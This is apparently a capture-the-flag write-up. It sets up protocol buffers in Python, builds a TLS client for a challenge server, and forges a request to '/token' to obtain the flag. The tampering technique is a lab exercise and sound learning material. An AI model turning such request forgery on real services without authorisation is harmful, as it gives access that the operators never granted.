# Research
In order to solve this problem, I had to learn a little bit about Protocol buffer.  I started by reading the documentation that was linked in the challenge description.  It looks like Google supports a few different languages, so I decided to go with Python.  But first I had to install the protocol buffer compiler (protoc).


# Protocol Buffer Compiler Setup
Download the protocol buffer project

```
$ git clone https://github.com/google/protobuf.git
```


Compile and install (from [Google's Git Documentaion](https://github.com/google/protobuf/tree/master/src))

```
$ cd ./protobuf/
$ ./autogen.sh
$ ./configure
$ make
$ make check
$ sudo make install
$ sudo ldconfig # refresh shared library cache.
```

Google has provided the contents of our message file in the challenge description, simply save it as main.proto.

Now that the protocol buffer compiler has been installed and we have our main.proto file created, it is time to run the compiler.

```
$ protoc -I=./ --python_out=./ main.proto
```

Wow, I am finally ready to start writing code.  I can create an empty Exchange message protocol buffer with the following snippet:

```python
import main_pb2
msg = main_pb2.Exchange()
```

# Client Code
Once I verified that I could import main_pb2, I setup the TCP/SSL socket as such:

```python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_SSLv23)
```

This is the code I wrote for reading from the socket, careful to obey the requirement for 32bit little-endian integers.

```python
def rx_msg(sock):
  data = sock.recv(4)
  
  #Unpack the message length
  msg_len = struct.unpack('<I', data)[0]
  data = sock.recv(msg_len)
  
  #Read the protocol buffer message
  msg = main_pb2.Exchange()
  msg.ParseFromString(data)
```

And the code for writing to the socket.

```python
def tx_msg(sock, msg):
  data = msg.SerializeToString()
  p = struct.pack('<I', len(data)) + data
  sock.send(p)
```

And add some simple code to print the request so that I can easily see what is happening.

```python
def print_req(req):
  print('VerbType: ' + repr(req.ver))
  print('URI: ' + repr(req.uri))
  print('Headers:')
  for i in req.headers:
  	print(repr(i))
  print('Body: ' + repr(req.body))
```

# Exploit
I should be all set, let's connect to the socket and see if I get a request.

```
VerbType: 0
URI: u'/not-token'
Headers:
key: "User-Agent"
value: "opabina-regalis.go"
```

Hmm...  Looks like someone is trying to connect to '/not-token'.  What if I create a new request for '/token' instead.

```python
new_dat = main_pb2.Exchange()
new_dat.request.ver = main_pb2.Exchange.GET
new_dat.request.uri = u'/token'
new_dat.request.body = ''
tx_msg(ws, new_dat)
```

Now let's see what the whole script output looks like.

```
VerbType: 0
URI: u'/not-token'
Headers:
key: "User-Agent"
value: "opabina-regalis.go"

Body: ''
Status: 200
Headers:
key: "Server"
value: "opabina-regalis.go"

Body: 'CTF{WhyDidTheTomatoBlush...ItSawTheSaladDressing}'
```
